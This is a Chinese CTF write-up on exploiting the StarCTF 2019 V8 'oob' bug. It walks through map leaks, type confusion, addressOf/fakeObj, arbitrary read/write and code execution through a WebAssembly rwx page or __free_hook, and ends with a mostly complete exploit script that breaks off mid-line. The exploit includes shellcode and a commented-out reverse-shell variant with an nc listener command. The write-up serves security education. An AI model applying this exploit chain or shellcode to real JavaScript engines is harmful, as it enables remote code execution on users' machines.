<h1 id="例题：StarCTF-2019-OOB"><a href="#例题：StarCTF-2019-OOB" class="headerlink" title="例题：StarCTF 2019 OOB"></a>例题：StarCTF 2019 OOB</h1><p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/starctf2019_oob" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>v8 commit:<code>6dc88c191f5ecc5389dc26efa3ca0907faef3598</code></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>观察 <code>oob.diff</code> 发现增加了如下功能，即任意数组可以以浮点数类型越界读写 8 字节。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BUILTIN</span>(ArrayOob)&#123;</span><br><span class="line">    <span class="type">uint32_t</span> len = args.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(isolate).<span class="built_in">undefined_value</span>();</span><br><span class="line">    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">    <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">            isolate, receiver, Object::<span class="built_in">ToObject</span>(isolate, args.<span class="built_in">receiver</span>()));</span><br><span class="line">    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::<span class="built_in">cast</span>(receiver);</span><br><span class="line">    FixedDoubleArray elements = FixedDoubleArray::<span class="built_in">cast</span>(array-&gt;<span class="built_in">elements</span>());</span><br><span class="line">    <span class="type">uint32_t</span> length = <span class="built_in">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(array-&gt;<span class="built_in">length</span>()-&gt;<span class="built_in">Number</span>());</span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//read</span></span><br><span class="line">        <span class="keyword">return</span> *(isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewNumber</span>(elements.<span class="built_in">get_scalar</span>(length)));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//write</span></span><br><span class="line">        Handle&lt;Object&gt; value;</span><br><span class="line">        <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">                isolate, value, Object::<span class="built_in">ToNumber</span>(isolate, args.<span class="built_in">at</span>&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">        elements.<span class="built_in">set</span>(length,value-&gt;<span class="built_in">Number</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(isolate).<span class="built_in">undefined_value</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="泄露-Map"><a href="#泄露-Map" class="headerlink" title="泄露 Map"></a>泄露 Map</h2><p>调试发现 <code>JSArray</code> 在内存中的结构如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/27e98fd1fed5dfb781c688b57cddb7eb.png"
                      alt="在这里插入图片描述"
                >因此可以通过 <code>oob</code> 泄露 <code>Map</code> 地址。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br></pre></td></tr></table></figure></div>

<h2 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h2><p>通过 <code>oob</code> 修改 <code>Map</code> 构造实现浮点数数组和 objec t数组的类型混淆，进而构造 <code>addressOf</code> 和 <code>fakeObj</code> 两个利用原语。</p>
<ul>
<li><code>addressOf</code>：传入一个 object ， 返回它的地址，实现对任意 object 的地址泄漏。</li>
<li><code>fakeObj</code>：传入一个地址，我们把这个地址指向的内存当做一个 object ， 并将它返回。实现对任意 object 的伪造。</li>
</ul>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h2><p>任意地址读写如果用 <code>DoubleArray</code> 实现会有如下问题：</p>
<ul>
<li>在数组进行元素访问时，它会和这个堆的基地址做一个 mask 的操作，保证了这个 <code>elements</code> 指针指向的内存段时属于 v8 的堆的范围。</li>
<li>在对伪造的浮点数数组进行操作的时候，触发了收集 Inline Cache 的函数，导致 SIGTRAP 。</li>
<li><code>DoubleArray</code> 构造的任意地址读写只能读写 <code>elements + 0x10</code> ，并且还会访问 <code>[elements, elements + 0x10)</code> 范围内的数据，而如果是在 rwx 段写 shellcode 需要从起始位置开始写，因此不能用 <code>DoubleArray</code> 构造的任意地址读写完成。</li>
</ul>
<p>因此这里需要使用 <code>ArrayBuffer</code> 和 <code>DataView</code> 来构造任意地址读写。这里介绍两种方法：</p>
<ul>
<li><p>伪造 <code>DoubleArray</code> 进行一次任意地址写修改一个 <code>ArrayBuffer</code> 的 <code>BackingStore</code> 指向另一个 <code>ArrayBuffer</code> 的 <code>BackingStore</code> ，之后每次任意地址读写都可以先用一个 <code>ArrayBuffer</code> 改另一个 <code>ArrayBuffer</code> 的 <code>BackingStore</code> 然后利用另一个 <code>ArrayBuffer</code> 进行任意地址读写。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/7729391b287f656bbc54f9168026d770.png"
                      alt="在这里插入图片描述"
                ><br>需要注意的是伪造的 <code>DoubleArray</code> 的 <code>Length</code> 字段是一个 <code>Smi</code> 类型，需要右移 32 位。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ab1 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> ab2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> dv1 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab1);</span><br><span class="line"><span class="keyword">var</span> dv2 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab2);</span><br><span class="line"><span class="keyword">var</span> ab1_bs_addr = <span class="title function_">addressOf</span>(ab1) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="keyword">var</span> ab2_bs_addr = <span class="title function_">addressOf</span>(ab2) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="title function_">u2d</span>(ab1_bs_addr - <span class="number">0x10n</span>),</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">fake_float_array = <span class="title function_">fakeObj</span>(<span class="title function_">addressOf</span>(float_array_mem) + <span class="number">0x30n</span>);</span><br><span class="line">fake_float_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(ab2_bs_addr - <span class="number">1n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>首先在 <code>DoubleArray</code> 中构造一个 <code>fake ArrayBuffer</code>，之后就可以通过 <code>DoubleArray</code> 修改 <code>BackingStore</code> 指针来进行任意地址读写。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a37f64a6db55de364bcd5330b6b1aa84.png"
                      alt="在这里插入图片描述"
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_ab_mem = [</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Propertries</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Elements</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1000n</span>),               <span class="comment">// ByteLength</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// BackingStore</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1900042319080808n</span>),   <span class="comment">// type</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab_addr = <span class="title function_">addressOf</span>(fake_ab_mem) + <span class="number">0x58n</span>;</span><br><span class="line">fake_ab_mem[<span class="number">0</span>] = <span class="title function_">u2d</span>(fake_ab_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="keyword">var</span> fake_ab = <span class="title function_">fakeObj</span>(fake_ab_addr);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="劫持程序执行流程"><a href="#劫持程序执行流程" class="headerlink" title="劫持程序执行流程"></a>劫持程序执行流程</h2><h3 id="利用-WebAssembly-写-shellcode"><a href="#利用-WebAssembly-写-shellcode" class="headerlink" title="利用 WebAssembly 写 shellcode"></a>利用 WebAssembly 写 shellcode</h3><p>利用 <code>WebAssembly</code> 开辟 rwx 段。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br></pre></td></tr></table></figure></div>
<p>上面这段 <code>WebAssembly</code> 代码对应的 <code>wat</code> 代码如下，是通过<a class="link"   href="https://webassembly.github.io/wabt/demo/wasm2wat/index.html" >这个网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>反编译得到的。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="title function_ invoke__">module</span></span><br><span class="line">  (type <span class="variable">$t0</span> (<span class="title function_ invoke__">func</span> (result i32)))</span><br><span class="line">  (func <span class="variable">$main</span> (export <span class="string">&quot;main&quot;</span>) (type <span class="variable">$t0</span>) (result i32)</span><br><span class="line">    (i32.<span class="keyword">const</span> <span class="number">42</span>))</span><br><span class="line">  (table <span class="variable">$T0</span> <span class="number">0</span> funcref)</span><br><span class="line">  (memory <span class="variable">$memory</span> (export <span class="string">&quot;memory&quot;</span>) <span class="number">1</span>))</span><br></pre></td></tr></table></figure></div>
<p>利用任意地址读泄露 rwx 段基址。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br></pre></td></tr></table></figure></div>
<p>写入 shellcode 并调用 <code>WebAssembly</code> 对应函数执行 shellcode 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x636c6163782fb848n</span>,</span><br><span class="line">    <span class="number">0x73752fb848500000n</span>,</span><br><span class="line">    <span class="number">0x8948506e69622f72n</span>,</span><br><span class="line">    <span class="number">0x89485750c03148e7n</span>,</span><br><span class="line">    <span class="number">0x3ac0c748d23148e6n</span>,</span><br><span class="line">    <span class="number">0x4944b84850000030n</span>,</span><br><span class="line">    <span class="number">0x48503d59414c5053n</span>,</span><br><span class="line">    <span class="number">0x485250c03148e289n</span>,</span><br><span class="line">    <span class="number">0x00003bc0c748e289n</span>,</span><br><span class="line">    <span class="number">0x0000000000050f00n</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// var shellcode=[</span></span><br><span class="line"><span class="comment">// 0x6a5f026a9958296an,</span></span><br><span class="line"><span class="comment">// 0xb9489748050f5e01n,</span></span><br><span class="line"><span class="comment">// 0x0100007f39300002n,</span></span><br><span class="line"><span class="comment">// 0x6a5a106ae6894851n,</span></span><br><span class="line"><span class="comment">// 0x485e036a050f582an,</span></span><br><span class="line"><span class="comment">// 0x75050f58216aceffn,</span></span><br><span class="line"><span class="comment">// 0x2fbb4899583b6af6n,</span></span><br><span class="line"><span class="comment">// 0x530068732f6e6962n,</span></span><br><span class="line"><span class="comment">// 0xe689485752e78948n,</span></span><br><span class="line"><span class="comment">// 0x000000000000050fn]</span></span><br><span class="line"><span class="comment">//nc -lvvp 12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div>

<h3 id="劫持-free-hook"><a href="#劫持-free-hook" class="headerlink" title="劫持 __free_hook"></a>劫持 __free_hook</h3><p>通过构造函数例如 <code>Array</code> 可以泄露 ELF 加载基址，进而通过 got 表泄露 libc 加载基址。<br>利用任意地址写修改 <code>__free_hook</code> 为 <code>system</code> 函数地址，之后 <code>print</code> 输出要执行的命令，在释放写有命令的堆块的时候实现任意命令执行。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/3b004ce33229326fc2ddc8ce73b1b455.png"
                      alt="在这里插入图片描述"
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> array_addr = <span class="title function_">addressOf</span>(<span class="title class_">Array</span>);</span><br><span class="line"><span class="keyword">var</span> elf_base = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">arbitrary_address_read</span>(array_addr - <span class="number">1n</span> + <span class="number">0x30n</span>) + <span class="number">0x41n</span>) - <span class="number">0xf8f680n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] elf base: &quot;</span> + <span class="title function_">hex</span>(elf_base));</span><br><span class="line"><span class="keyword">var</span> libc_base = <span class="title function_">arbitrary_address_read</span>(elf_base + <span class="number">0x1271b90n</span>) - <span class="number">0x7b0c0n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] libc base: &quot;</span> + <span class="title function_">hex</span>(libc_base));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> system_addr = libc_base + <span class="number">0x4f420n</span>;</span><br><span class="line"><span class="keyword">var</span> free_hook_addr = libc_base + <span class="number">0x3ed8e8n</span>;</span><br><span class="line"><span class="title function_">arbitrary_address_write</span>(free_hook_addr, system_addr);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;/snap/bin/gnome-calculator&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab_mem = [</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),            <span class="comment">//Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),            <span class="comment">//Propertries</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),            <span class="comment">//Elements</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1000n</span>),       <span class="comment">//ByteLength</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),            <span class="comment">//BackingStore</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1900042319080808n</span>),<span class="comment">//type</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab_addr = <span class="title function_">addressOf</span>(fake_ab_mem) + <span class="number">0x58n</span>;</span><br><span class="line">fake_ab_mem[<span class="number">0</span>] = <span class="title function_">u2d</span>(fake_ab_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="keyword">var</span> fake_ab = <span class="title function_">fakeObj</span>(fake_ab_addr);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title 